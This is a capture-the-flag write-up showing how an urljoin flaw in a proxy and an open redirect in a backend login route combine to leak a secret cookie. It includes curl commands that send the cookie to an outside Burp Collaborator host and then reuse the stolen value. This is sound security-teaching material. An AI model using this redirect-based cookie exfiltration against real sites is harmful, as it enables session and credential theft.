# Don't Touch My Flag

## Description

![](Pasted%20image%2020220312165558.png)

## Solution

We can download the files and immediately notice that there are 2 servers, a proxy server and the backend server with the flag.


### Using secret to call the backend server

Looking at the proxy server code (`proxy/app/main.py`), there are a few interesting Notes.

1.  `/` just requests the `/get` route
2. The `/get` route passes the secret cookie to a backend, to any route
	1. Usually it is to `/flag`, but we can also pass it to `/login` on the backend
 
```python
@app.route("/get")
def get():
    uri = request.args.get("uri", "/")
    full_url = urllib.parse.urljoin(os.environ["BACKEND_URL"], uri)
    
    r = requests.get(full_url, cookies={
        "secret": secret
    })
    print(uri, full_url, r.text)
    if r.status_code != 200:
        return f"Request failed: received status code {r.status_code}"

    censored = censor(r.text)
    return censored


@app.route("/")
def index():
    return """
Heres your flag: <span id="flag"></span>
<script>
fetch("/get?uri=/flag")
    .then((res) => res.text())
    .then((flag) => document.querySelector("#flag").innerText = flag);
</script>
"""
```

This line of code is interesting, as it means we can inject parameters

```python
full_url = urllib.parse.urljoin(os.environ["BACKEND_URL"], uri)
```

Hence, I tried this out, which worked

```bash
(base) [hacker@hackerbook Don't Touch My Flag]$ curl "http://chals.ctf.sg:40101/get?&uri=login%3fnext=/flag"
****************************
```

### Extracting Fake Secret

Looking at the backend code (`backend/app/main.py`), this function is interesting

```python
@app.route("/login")
def login():
    next_uri = request.args.get("next", "/")

    if request.cookies.get("secret") == secret:
        return redirect(next_uri)

    if request.args.get("secret") == secret:
        resp = make_response(redirect(next_uri))
        resp.set_cookie("secret", secret)

        return resp
    else:
        return ":(
```

The important part is the `redirect` function. The variable `next_uri` can take a full URL, not just the path, like shown below

```python
redirect("http://www.example.com")
```

As such, we tried using Burp Collaborator (from a totally legit copy of Burp Suite Pro) to get a URL that the app can call from. Afterwards, we got the app to call this URL. We can then extract the cookie.

```bash
$ curl "http://chals.ctf.sg:40101/get?&uri=login%3fnext=http%3A%2F%2F3bf83sb0bz974qukb0gyjh4y1p7fv4%2Eburpcollaborator%2Enet"
*****************************************************
```

![](Pasted%20image%2020220312165919.png)

### Getting the Flag

```bash
$ curl "http://chals.ctf.sg:40102/flag" --cookie "secret=8byEt7F60cCSRpQs1jeAXQqByOsK5P5b"
CTFSG{d0nT_toUcH_mY_c00k13s}$ 
```

## Flag

`CTFSG{d0nT_toUcH_mY_c00k13s}`